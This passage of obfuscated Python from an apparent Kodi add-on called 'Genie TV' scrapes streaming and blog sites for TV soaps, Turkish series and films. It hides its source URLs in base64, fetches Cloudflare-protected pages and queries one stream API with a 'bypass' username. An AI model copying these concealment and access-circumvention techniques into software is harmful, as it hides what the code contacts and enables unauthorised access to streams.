    if 90 - 90: o0OOOoO0 % Oo - Oo . iIii1I11I1II1 / Ii11I + OOOO00ooo0Ooo
    ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
    if 89 - 89: ii
 if o0OO0oooo != 'Failed' :
  O0O0 = re . compile ( 'href="([^"]*)"><img src="([^"]*)" alt="([^"]*)"' ) . findall ( o0OO0oooo )
  for iI1i11 , oO0O00oOOoooO , i1I1I in O0O0 :
   if oOOoo00O00o in i1I1I . lower ( ) :
    iii1111iiI1ii ( '[COLORgreen]' + i1I1I + ' CoolSeries[/COLOR]' , iI1i11 , 7052 , oO0O00oOOoooO )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 30 , "" , "Getting CoolSeries Links" )
    if 87 - 87: O00oo0OO0oOOO % Oo
    ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
 if OO00O0O != 'Failed' :
  oOooOOOoOo = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( OO00O0O )
  for i1I1I in oOooOOOoOo :
   if oOOoo00O00o in i1I1I . lower ( ) :
    iii1111iiI1ii ( '[COLORgreen]' + ( i1I1I ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) + ' source 1 [/COLOR]' , ( iI1i11 + i1I1I ) . replace ( ' ' , '%20' ) , 1006 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 40 , "" , "Getting Source 1 Links" )
    if 62 - 62: Ooo00oOo00o + OO0O / O00oo0OO0oOOO * i11iIiiIii
    ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
 if i11i1 != 'Failed' :
  IiiiiI1i1Iii = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( i11i1 )
  for i1I1I in IiiiiI1i1Iii :
   if oOOoo00O00o in i1I1I . lower ( ) :
    iii1111iiI1ii ( ( i1I1I + ' source 2' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( Iii1I1111ii + i1I1I ) . replace ( ' ' , '%20' ) , 1006 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 50 , "" , "Getting Source 2 Links" )
    if 37 - 37: O00oo0OO0oOOO
    ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
 if i1i1iIII11i != 'Failed' :
  ooO0000o00O = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( i1i1iIII11i )
  for i1I1I in IiiiiI1i1Iii :
   if oOOoo00O00o in i1I1I . lower ( ) :
    iii1111iiI1ii ( ( i1I1I + ' source 3' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( Ii1IIiI1i + i1I1I ) . replace ( ' ' , '%20' ) , 1006 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 60 , "" , "Getting Source 3 Links" )
    if 33 - 33: Ooo00oOo00o - O0 - Ooo00oOo00o
    ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
 if IiII != 'Failed' :
  oo00ooooOOo00 = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( IiII )
  for i1I1I in IiiiiI1i1Iii :
   if oOOoo00O00o in i1I1I . lower ( ) :
    iii1111iiI1ii ( ( i1I1I + ' source 4' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( iIIIIII + i1I1I ) . replace ( ' ' , '%20' ) , 1006 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 70 , "" , "Getting Source 4 Links" )
    if 94 - 94: i1i1i11IIi * OOOO00ooo0Ooo * OoooooooOO / OOooOOo . i1i1i11IIi - OOooOOo
    ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
 if oOo != 'Failed' :
  OO00Oooo000 = re . compile ( '<a href="(.+?)" class="film-image">\n<img src="(.+?)" alt=""/>\n</a>\n<div class="tss-detail">\n<a class="title" style="" href=".+?">\n<span class="position">.+?</span>\n(.+?)</a>' ) . findall ( oOo )
  for iI1i11 , oO0O00oOOoooO , i1I1I in OO00Oooo000 :
   if oOOoo00O00o in i1I1I . lower ( ) :
    iii1111iiI1ii ( '[COLORgreen]' + i1I1I + ' - Source - Dizi[/COLOR]' , iI1i11 , 8062 , oO0O00oOOoooO )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 80 , "" , "Getting Dizi Links" )
    if 13 - 13: Ii11I / i1i1i11IIi - Ooo00oOo00o / Ii11I . i1IIi
    ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
 if III11I11ii != 'Failed' :
  O0OoO0oO00 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( III11I11ii )
  for iI1i11 , o0OOo0o0O0O , OOoooO00o0oo0 , oOO0o0oo0 , i1I1I in O0OoO0oO00 :
   if oOOoo00O00o in i1I1I . lower ( ) :
    O0Oo000ooO00 ( ( '[COLORgreen]' + i1I1I + '- Source Scooby[/COLOR]' ) , iI1i11 , 1016 , o0OOo0o0O0O , oOO0o0oo0 , OOoooO00o0oo0 )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 90 , "" , "Getting Scooby Links" )
    if 22 - 22: O0 - OOOO00ooo0Ooo + o0OOOoO0 . OOooOooo * i1IIi
    ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
    if 26 - 26: iIii1I11I1II1 * OOooOOo . OOOO00ooo0Ooo
 I11III11III1 = [ 'a' , 'b' , 'c' , 'd' , 'e' , 'f' , 'g' , 'h' , 'i' , 'j' , 'k' , 'l' , 'm' , 'n' , 'o' , 'p' , 'q' , 'r' , 's' , 't' , 'u' , 'v' , 'w' , 'x' , 'y' , 'z' ]
 if 81 - 81: O0 . O0
 for I1IIIIiii1i in I11III11III1 :
  o0IiiiI111I = ooooooO0oo + I1IIIIiii1i + II11iiii1Ii
  I11II1i1 = iii ( o0IiiiI111I )
  if I11II1i1 != 'Failed' :
   OOoO0o = re . compile ( '<item>.+?<title>(.+?)</title>.+?<description>(.+?)</description>.+?<link>(.+?)</link>.+?<thumbnail>(.+?)</thumbnail>.+?<fanart>(.+?)</fanart>.+?<mode>(.+?)</mode>.+?</item>' , re . DOTALL ) . findall ( I11II1i1 )
   for i1I1I , OOoooO00o0oo0 , iI1i11 , oO0O00oOOoooO , o0OO0o0oOOO0O , iIiii in OOoO0o :
    if oOOoo00O00o in i1I1I . lower ( ) :
     O0Oo000ooO00 ( '[COLORgreen]' + i1I1I + ' - Source Pandoras[/COLOR]' , iI1i11 , iIiii , oO0O00oOOoooO , o0OO0o0oOOO0O , OOoooO00o0oo0 )
     Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
     Oo0oO0ooo . update ( 100 , "" , "Getting Pandoras Links" )
     if 75 - 75: iIii1I11I1II1 % i1i1i11IIi + ii11ii1ii * O0 . O00oo0OO0oOOO - OO0O
     ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
     if 32 - 32: OOooOooo % ii - i1IIi
     if 40 - 40: iIii1I11I1II1 + O00oo0OO0oOOO * I1IiI + ii
 xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
def I1Ii1i11I1I ( ) :
 if 71 - 71: OOOo0 * i1IIi % OOOO00ooo0Ooo
 oOOoo00O00o = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 oooooo0O000o = oOOoo00O00o . lower ( )
 iI1i11 = ( i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYvRGVzaVN0cmVhbXMvaW5kZXgyMDIucGhwP3RhZz1nZXRfYWxsX2NoYW5uZWwmdXNlcm5hbWU9YnlwYXNz' ) )
 OO00O0O = iii ( iI1i11 )
 oOooOOOoOo = re . compile ( '"id":".+?","name":"(.+?)","img":"(.+?)","stream_url3":".+?","cat_id":"(.+?)","stream_url2":".+?","stream_url":".+?"}' , re . DOTALL ) . findall ( OO00O0O )
 for i1I1I , oO0O00oOOoooO , O0i1I11I in oOooOOOoOo :
  I1IIi1i1Ii1I1 = i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYv' ) + ( oO0O00oOOoooO ) . replace ( '\\' , '' )
  if oOOoo00O00o in i1I1I . lower ( ) :
   iii1111iiI1ii ( i1I1I , '' , 7022 , I1IIi1i1Ii1I1 )
   if 85 - 85: OoooooooOO + Ii11I . iIii1I11I1II1 / OOOO00ooo0Ooo / OOOO00ooo0Ooo
 xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 1 - 1: Ii11I - iIii1I11I1II1 * Ooo00oOo00o * o0OOOoO0 * O0
 if 98 - 98: OO0O . Ii11I
def OOooO00OO ( url ) :
 O00OoOOoo = cloudflare . source ( url )
 oOooOOOoOo = re . compile ( '<a class="season" href="(.+?)">\n(.+?)\n</a>\n</span>\n<span>\n<a class="episode" href=".+?">\n(.+?)\n</a>\n</span>\n<span>\n<a class="episode-name" href=".+?">\n(.+?)</a>' ) . findall ( O00OoOOoo )
 for url , IIiIii , iiI1I , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( ( IIiIii ) . replace ( 'Sezon' , ' Season ' ) + ( iiI1I ) . replace ( 'Bölüm' , ' Episode ' ) + i1I1I , url , 8063 , '' )
  if 49 - 49: i11iIiiIii - ii11ii1ii - OOOO00ooo0Ooo / OoooooooOO % I1IiI
  if 65 - 65: O0 - o0OOOoO0 . OOooOooo
  if 19 - 19: ii11ii1ii . O00oo0OO0oOOO - OOooOOo + OOOO00ooo0Ooo - OOooOooo
  if 13 - 13: i1i1i11IIi * ii11ii1ii / ii11ii1ii / iIii1I11I1II1 % iIii1I11I1II1
def i1i1IIII ( url ) :
 O00OoOOoo = cloudflare . source ( url )
 oOooOOOoOo = re . compile ( 'file: "(.+?)",.+?label: "(.+?)",' , re . DOTALL ) . findall ( O00OoOOoo )
 for url , i1I1I in oOooOOOoOo :
  oo00OOoOoO00 ( i1I1I , url , 222 , '' )
  if 95 - 95: OOOo0
  if 95 - 95: Ii11I % ii11ii1ii + OOooOOo % OO0O
  if 36 - 36: O0 / i1IIi % OoOoOO00 / O00oo0OO0oOOO
  if 96 - 96: Oo / ii . OoOoOO00 . Oo
def ooIi111iII ( ) :
 if 83 - 83: OoooooooOO + Ooo00oOo00o * ii . O0
 O00OoOOoo = cloudflare . source ( i1111 ( 'aHR0cDovL2RpemlsYWIuY29t' ) )
 oOooOOOoOo = re . compile ( '<li id=".+?">.+?<a href="(.+?)">.+?<img width="40" height="40" src="(.+?)" alt=""/>.+?<span class="title">\n(.+?)</span>.+?<span class="alt-title">\n(.+?)</span>.+?</a>.+?</li>' , re . DOTALL ) . findall ( O00OoOOoo )
 for iI1i11 , oO0O00oOOoooO , i1I1I , iiI1I in oOooOOOoOo :
  iii1111iiI1ii ( i1I1I + '  -  ' + ( iiI1I ) . replace ( 'sezon' , 'Season' ) . replace ( 'bölüm' , 'Episode' ) , iI1i11 , 8063 , oO0O00oOOoooO )
  if 13 - 13: OOooOOo
def IIi1ii ( ) :
 OOOooo = OooO0OO ( i1111 ( 'aHR0cDovL3d3dy50dmd1aWRlLmNvLnVrLw==' ) )
 oOooOOOoOo = re . compile ( '<a href="(.+?)"  qt-title=".+?" qt-text=".+?<br> .+?" title="(.+?)".+?class=".+? src="(.+?)" alt=".+?" /></a>' , re . DOTALL ) . findall ( OOOooo )
 for iI1i11 , i1I1I , oO0O00oOOoooO in oOooOOOoOo :
  oo00OOoOoO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , iI1i11 , 8002 , oO0O00oOOoooO )
def Ii1i1i ( url ) :
 OOOooo = OooO0OO ( url )
 oOooOOOoOo = re . compile ( '<table border="0".+?url((.+?));background-repeat: no-repeat;">.+?<tr>.+?<span class="season">(.+?)</span><br>.+?<a href="(.+?)"+?>(.+?)</span><br>.+?<span class="programmetext">(.+?)</span></a><br>' , re . DOTALL ) . findall ( OOOooo )
 for oO0O00oOOoooO , time , url , i1I1I , oOoooO00O in oOooOOOoOo :
  O0Oo000ooO00 ( '%s %s' % ( '[COLORgreen]' + i1I1I + '[/COLOR]' , time ) , url , 1015 , oO0O00oOOoooO , oOoooO00O )
  if 83 - 83: OOOO00ooo0Ooo - ii11ii1ii * ii
def oOO00OO0OooOo ( ) :
 if 13 - 13: O0 % OO0O % OOOO00ooo0Ooo
 iii1111iiI1ii ( 'Coronation Street' , '' , 8001 , '' )
 iii1111iiI1ii ( 'Eastenders' , '' , 8002 , '' )
 iii1111iiI1ii ( 'Emmerdale' , '' , 8003 , '' )
 iii1111iiI1ii ( 'Hollyoaks' , '' , 8004 , '' )
 iii1111iiI1ii ( 'Im a Celebrity' , '' , 8005 , '' )
 if 25 - 25: OoooooooOO % OOooOooo * OoOoOO00 - Ooo00oOo00o
 if 95 - 95: OOOo0 % o0OOOoO0 * OOOo0 + O0 . o0OOOoO0 % OoooooooOO
 if 6 - 6: I1IiI - OO0O * OOooOOo + I1IiI % OOooOOo
 if 100 - 100: Ooo00oOo00o % o0OOOoO0 - OOOO00ooo0Ooo % OOOO00ooo0Ooo % OOOO00ooo0Ooo / OO0O
def OOO000Oo ( ) :
 OO00O0O = iii ( 'http://uksoapshare.blogspot.co.uk/' )
 oOooOOOoOo = re . compile ( '<a href="(.+?)".+?target=_blank>(.+?)</a>' ) . findall ( OO00O0O )
 for iI1i11 , i1I1I in oOooOOOoOo :
  if 'Holly' in i1I1I :
   oO0O00oOOoooO = 'http://2.bp.blogspot.com/-9c7Sieh1RKs/UjD6TGAEEnI/AAAAAAAAAC8/84uwHfxcuYg/s1600/Hollyoaks.png'
   if 'huge' in iI1i11 :
    oo00OOoOoO00 ( ( i1I1I ) . replace ( '.HDTV.x264-SS.mp4' , '' ) . replace ( '_HDTV.x264' , '' ) . replace ( '-SS.mp4' , '' ) . replace ( '_720p.HDTV.x264.' , ' ' ) . replace ( '_720p' , '' ) , iI1i11 . replace ( '\\/' , '/' ) , 8006 , oO0O00oOOoooO )
   else :
    pass
    if 8 - 8: OO0O - Oo + iIii1I11I1II1 + i1IIi * OOooOooo - iIii1I11I1II1
 xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE_IGNORE_THE ) ;
 if 30 - 30: OOOO00ooo0Ooo / ii11ii1ii
def iI1iIIIIIiIi1 ( ) :
 OO00O0O = iii ( 'http://uksoapshare.blogspot.co.uk/' )
 oOooOOOoOo = re . compile ( '<a href="(.+?)".+?target=_blank>(.+?)</a>' ) . findall ( OO00O0O )
 for iI1i11 , i1I1I in oOooOOOoOo :
  if 'East' in i1I1I :
   oO0O00oOOoooO = 'http://3.bp.blogspot.com/-KWHcNbNJU8Y/Vi1ousRl7fI/AAAAAAAAAT8/ksNE12LH0nE/s1600/eastenders.jpg'
   if 'huge' in iI1i11 :
    oo00OOoOoO00 ( ( i1I1I ) . replace ( '.HDTV.x264-SS.mp4' , '' ) . replace ( '_HDTV.x264' , '' ) . replace ( '-SS.mp4' , '' ) . replace ( '_720p.HDTV.x264.' , ' ' ) . replace ( '_720p' , '' ) , iI1i11 . replace ( '\\/' , '/' ) , 8006 , oO0O00oOOoooO )
   else :
    pass
    if 19 - 19: I1IiI . OOooOOo . OoooooooOO
 xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 13 - 13: Ii11I . Oo / OoOoOO00
def iiI1iIII1ii ( ) :
 OO00O0O = iii ( 'http://uksoapshare.blogspot.co.uk/' )
 oOooOOOoOo = re . compile ( '<a href="(.+?)".+?target=_blank>(.+?)</a>' ) . findall ( OO00O0O )
 for iI1i11 , i1I1I in oOooOOOoOo :
  if 'Emmer' in i1I1I :
   oO0O00oOOoooO = 'http://2.bp.blogspot.com/-UfDcxisVV5c/UjH9vUicZ3I/AAAAAAAAADc/8Ozuiz1ojxw/s1600/Emmerdale.jpg'
   if 'huge' in iI1i11 :
    oo00OOoOoO00 ( ( i1I1I ) . replace ( '.HDTV.x264-SS.mp4' , '' ) . replace ( '_HDTV.x264' , '' ) . replace ( '-SS.mp4' , '' ) . replace ( '_720p.HDTV.x264.' , ' ' ) . replace ( '_720p' , '' ) , iI1i11 . replace ( '\\/' , '/' ) , 8006 , oO0O00oOOoooO )
   else :
    pass
    if 5 - 5: o0OOOoO0 % OoooooooOO . I1IiI
 xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 67 - 67: ii11ii1ii + OOooOooo
def o0O00OooooO ( ) :
 OO00O0O = iii ( 'http://uksoapshare.blogspot.co.uk/' )
 oOooOOOoOo = re . compile ( '<a href="(.+?)".+?target=_blank>(.+?)</a>' ) . findall ( OO00O0O )
 for iI1i11 , i1I1I in oOooOOOoOo :
  if 'Coro' in i1I1I :
   oO0O00oOOoooO = 'http://3.bp.blogspot.com/-hofvfBQVexs/UjErIfNdS4I/AAAAAAAAADQ/Q-vVGu3apYU/s1600/corrie.jpg'
   if 'huge' in iI1i11 :
    oo00OOoOoO00 ( ( i1I1I ) . replace ( '.HDTV.x264-SS.mp4' , '' ) . replace ( '_HDTV.x264' , '' ) . replace ( '-SS.mp4' , '' ) . replace ( '_720p.HDTV.x264.' , ' ' ) . replace ( '_720p' , '' ) , iI1i11 . replace ( '\\/' , '/' ) , 8006 , oO0O00oOOoooO )
   else :
    pass
    if 77 - 77: OOOo0 % OO0O
 xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 74 - 74: I1IiI / i1IIi % OoooooooOO
def o00o0o000Oo ( ) :
 OO00O0O = iii ( 'http://uksoapshare.blogspot.co.uk/' )
 oOooOOOoOo = re . compile ( '<a href="(.+?)" target="_blank">(.+?)</a>' ) . findall ( OO00O0O )
 for iI1i11 , i1I1I in oOooOOOoOo :
  if 'Celeb' in i1I1I :
   oO0O00oOOoooO = 'http://3.bp.blogspot.com/-a_yDotWU_pY/VkotKWaG_gI/AAAAAAAAAUk/8Q5iNM6p37k/s1600/iacgoh.jpg'
   if 'huge' in iI1i11 :
    oo00OOoOoO00 ( ( i1I1I ) . replace ( '.HDTV.x264-SS.mp4' , '' ) . replace ( '_HDTV.x264' , '' ) . replace ( '-SS.mp4' , '' ) . replace ( '_720p.HDTV.x264.' , ' ' ) . replace ( '_720p' , '' ) , iI1i11 . replace ( '\\/' , '/' ) , 8006 , oO0O00oOOoooO )
   else :
    pass
    if 100 - 100: i1IIi - i11iIiiIii . o0OOOoO0 * Ooo00oOo00o
def oOIIII ( name , url ) :
 ooOOo = urlresolver . HostedMediaFile ( url ) . valid_url ( )
 if ooOOo :
  i1iii1IiiiI1i1 = urlresolver . HostedMediaFile ( url ) . resolve ( )
 else :
  OOOooo = open_url ( url )
  url = re . compile ( 'src="(.+?)"></iframe>' ) . findall ( OOOooo ) [ 0 ]
  url = url . split ( '?autoplay' ) [ 0 ]
  OOOooo = open_url ( url )
  IIIiI1i1 = re . compile ( 'mp4","url":"(.+?)"' ) . findall ( OOOooo ) [ - 1 ]
  i1iii1IiiiI1i1 = IIIiI1i1 . replace ( '\\/' , '/' )
 o0OoOoo00O = xbmcgui . ListItem ( name , '' , '' )
 o0OoOoo00O . setPath ( i1iii1IiiiI1i1 )
 xbmcplugin . setResolvedUrl ( int ( sys . argv [ 1 ] ) , True , o0OoOoo00O )
 if 13 - 13: Ii11I * OOOO00ooo0Ooo / O0 * OOooOOo
 if 35 - 35: i1IIi * i11iIiiIii % ii11ii1ii / i1i1i11IIi / i1i1i11IIi
def OO00oO0OoO0o ( ) :
 OOOooo = iii ( i1111 ( 'aHR0cDovL3d3dy5kaXppYm94aGQuY29tLw==' ) )
 oOooOOOoOo = re . compile ( 'class="film menu-item menu-item-type-post_type menu-item-object-page menu-item-36980"><a href="(.+?)"><i class="fa fa-film"></i><span>(.+?)</span></a></li>' ) . findall ( OOOooo )
 IiiiiI1i1Iii = re . compile ( 'class="menu-item menu-item-type-post_type menu-item-object-page menu-item-52949"><a href="(.+?)"><i class="fa fa-"></i><span>(.+?)</span></a></li>' ) . findall ( OOOooo )
 for iI1i11 , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( ( '[COLORgreen]' + i1I1I + '[/COLOR]' ) . replace ( 'Diziler' , 'Series' ) , iI1i11 , 7071 , ii11iIi1I + 'popcorn.png' )
 for iI1i11 , i1I1I in IiiiiI1i1Iii :
  iii1111iiI1ii ( ( '[COLORgreen]' + i1I1I + '[/COLOR]' ) . replace ( 'Filmler' , 'Movies' ) , iI1i11 , 7071 , ii11iIi1I + 'popcorn.png' )
  if 5 - 5: Ii11I % Oo % i1i1i11IIi % OO0O
def I1Iiii ( ) :
 OOOooo = iii ( i1111 ( 'aHR0cDovL3d3dy5zbmFnZmlsbXMuY29tL2NhdGVnb3JpZXMv' ) )
 oOooOOOoOo = re . compile ( '<a class="nav-item" href="(.+?)">(.+?)</a>' ) . findall ( OOOooo )
 for iI1i11 , i1I1I in oOooOOOoOo :
  if 'Movies' in i1I1I :
   iii1111iiI1ii ( '[COLORgreen]' + i1I1I + '[/COLOR]' , 'http://www.snagfilms.com' + ( iI1i11 ) . replace ( 'http://www.snagfilms.com' , '' ) , 7061 , ii11iIi1I + 'popcorn.png' )
def I1I1Iii1Iiii ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( '<a class="object-link size-poster".+?href="(.+?)" data-type="category">.+?src="(.+?)" alt="Image of (.+?)" />' , re . DOTALL ) . findall ( OOOooo )
 oOooOOOoOo = re . compile ( '<a class="object-link size-poster".+?href="(.+?)" data-type="category">.+?src="(.+?)" alt="Image of (.+?)" />' , re . DOTALL ) . findall ( OOOooo )
 IiiiiI1i1Iii = re . compile ( "<li class='current'>.+?</li><li ><a href='(.+?)'>.+?</a></li><li" , re . DOTALL ) . findall ( OOOooo )
 for url , oO0O00oOOoooO , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( '[COLORgreen]' + i1I1I + '[/COLOR]' , 'http://www.snagfilms.com' + ( url ) . replace ( 'http://www.snagfilms.com' , '' ) , 7067 , oO0O00oOOoooO )
 for url in IiiiiI1i1Iii :
  iii1111iiI1ii ( '[COLORgreen]NEXT PAGE[/COLOR]' , ( url ) . replace ( '&#038;' , '&' ) , 7063 , ii11iIi1I + 'Next.png' )
  if 4 - 4: i1i1i11IIi
  if 93 - 93: ii % i1IIi
def OOo0OOoo00 ( url ) :
 OOOooo = iii ( i1111 ( 'aHR0cDovL3d3dy5zbmFnZmlsbXMuY29tL2NhdGVnb3JpZXMv' ) )
 oOooOOOoOo = re . compile ( '<a class="object-link size-poster".+?href="(.+?)" data-type="category">.+?src="(.+?)" alt="Image of (.+?)" />' , re . DOTALL ) . findall ( OOOooo )
 for url , oO0O00oOOoooO , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( '[COLORgreen]' + i1I1I + '[/COLOR]' , 'http://www.snagfilms.com' + ( url ) . replace ( 'http://www.snagfilms.com' , '' ) , 7062 , oO0O00oOOoooO )
  if 22 - 22: OO0O / OO0O - OOooOooo % OOOO00ooo0Ooo . Ii11I + i1i1i11IIi
  if 64 - 64: i1IIi % ii11ii1ii / OOooOooo % OoooooooOO
def I1iii1 ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( 'href="(.+?)".+?src="(.+?)" alt="Image of (.+?)"' , re . DOTALL ) . findall ( OOOooo )
 for url , oO0O00oOOoooO , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( ( '[COLORgreen]' + i1I1I + '[/COLOR]' ) . replace ( '&#x27;' , '' ) , 'http://www.snagfilms.com' + ( url ) . replace ( 'http://www.snagfilms.com' , '' ) , 7067 , oO0O00oOOoooO )
  if 19 - 19: ii % OoooooooOO . OoooooooOO
def IiIiI11IIi11Iii ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( '<div class="film-container">.+?<iframe src="(.+?)"' , re . DOTALL ) . findall ( OOOooo )
 for url in oOooOOOoOo :
  ii11i1I1i ( 'http://www.snagfilms.com' + ( url ) . replace ( 'http://www.snagfilms.com' , '' ) )
  if 49 - 49: OoooooooOO + OoooooooOO / Ii11I . ii
def ii11i1I1i ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( 'file: "(.+?)",.+?label: "(.+?)"' , re . DOTALL ) . findall ( OOOooo )
 for url , i1I1I in oOooOOOoOo :
  oo00OOoOoO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , url , 222 , ii11iIi1I + 'popcorn.png' )
  if 13 - 13: OoOoOO00 . O00oo0OO0oOOO - o0OOOoO0 . Ooo00oOo00o . iIii1I11I1II1
  if 66 - 66: Oo * i1i1i11IIi
  if 83 - 83: OoooooooOO
  if 12 - 12: OO0O
def I11OOO0 ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( '</h4><p><ul><li><a href="([^"]*)">(.+?)<.+?class=' ) . findall ( OOOooo )
 IiiiiI1i1Iii = re . compile ( '<li><a href="([^"]*)">(.+?)<.+?class=' ) . findall ( OOOooo )
 for url , i1I1I in oOooOOOoOo :
  if '(cooltvseries.com)' in i1I1I :
   oo00OOoOoO00 ( ( '[COLORgreen]' + i1I1I + ' -(360)-[/COLOR]' ) . replace ( ' - (cooltvseries.com).mp4' , '' ) , url , 7053 , ii11iIi1I + 'CoolSeries.png' )
 for url , i1I1I in IiiiiI1i1Iii :
  if '(cooltvseries.com)' in i1I1I :
   oo00OOoOoO00 ( ( '[COLORgreen]' + i1I1I + '[/COLOR]' ) . replace ( ' - (cooltvseries.com).mp4' , '' ) , url , 7053 , ii11iIi1I + 'CoolSeries.png' )
def I1Ii1 ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( '<source type="video/mp4" src="([^"]*)"/>' ) . findall ( OOOooo )
 for url in oOooOOOoOo :
  ooOooOoOoO ( ( url ) . replace ( ' ' , '%20' ) )
  if 67 - 67: OOOO00ooo0Ooo % i11iIiiIii . iIii1I11I1II1 * OOOo0 - OOOO00ooo0Ooo + OOooOooo
  if 48 - 48: ii11ii1ii
def o0o ( ) :
 OOOooo = iii ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vc2VjcmV0L2Nsb3VkLnBocA==' ) )
 oOooOOOoOo = re . compile ( '<li class="col-sm-2">.+?<a href="#" class="thumbnail" data-src="(.+?)" data-toggle="modal".+?data-target="#infoModal" name="(.+?)"> <img src="(.+?)" alt=".+?" width="130px"' , re . DOTALL ) . findall ( OOOooo )
 for iI1i11 , i1I1I , oO0O00oOOoooO in oOooOOOoOo :
  oo00OOoOoO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , 'http://stream.cloudtv.bz/stream/channel/20/' + ( i1111 ( iI1i11 ) ) , 222 , oO0O00oOOoooO )
  if 39 - 39: Ii11I + Ooo00oOo00o
def oOoOOOO0OOO ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( 'src="([^"]*)".+?alt=""></a><div class="entry unvoted"><p class="title"><a class="title may-blank " href="([^"]*)" tabindex=.+?>(.+?)</a>' , re . DOTALL ) . findall ( OOOooo )
 next = re . compile ( '<a href="([^"]*)" rel="nofollow next"' , re . DOTALL ) . findall ( OOOooo )
 for oO0O00oOOoooO , url , i1I1I in oOooOOOoOo :
  if 'youtu' in url :
   oo00OOoOoO00 ( ( '[COLORgreen]' + i1I1I + '[/COLOR]' ) . replace ( '&quot;' , '"' ) . replace ( '&amp;' , ' & ' ) , url , 7051 , 'http:' + oO0O00oOOoooO )
 for url in next :
  iii1111iiI1ii ( '[COLORgreen]NEXT[/COLOR]' , url , 7050 , ii11iIi1I + 'Next.png' )
  if 58 - 58: OOOO00ooo0Ooo % i11iIiiIii / i11iIiiIii * OO0O - o0OOOoO0
def i11ii111i1ii ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( 'rel="shortlink" href="([^"]*)">' , re . DOTALL ) . findall ( OOOooo )
 for url in oOooOOOoOo :
  yt . PlayVideo ( ( url ) . replace ( 'https://youtu.be/' , '' ) )
  if 97 - 97: i11iIiiIii + Oo * Ii11I % O00oo0OO0oOOO . i1i1i11IIi
def iiOo0 ( url ) :
 OOOooo = iii
 oOooOOOoOo = re . compile ( 'id:"(.+?)",url:"(.+?)"' , re . DOTALL ) . findall ( OOOooo )
 for url , oO0O00oOOoooO , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( '[COLORgreen]' + i1I1I + '[/COLOR]' , url , 222 , oO0O00oOOoooO )
  if 75 - 75: Ooo00oOo00o / OOooOooo + OoOoOO00 % i1i1i11IIi . i11iIiiIii
  if 76 - 76: O00oo0OO0oOOO . i1i1i11IIi % O00oo0OO0oOOO - o0OOOoO0
  if 51 - 51: OoooooooOO + OOooOOo * iIii1I11I1II1 * ii / i1IIi
  if 19 - 19: O00oo0OO0oOOO - I1IiI % ii / OoooooooOO % O00oo0OO0oOOO
  if 65 - 65: O0 . ii
def oOoO0 ( ) :
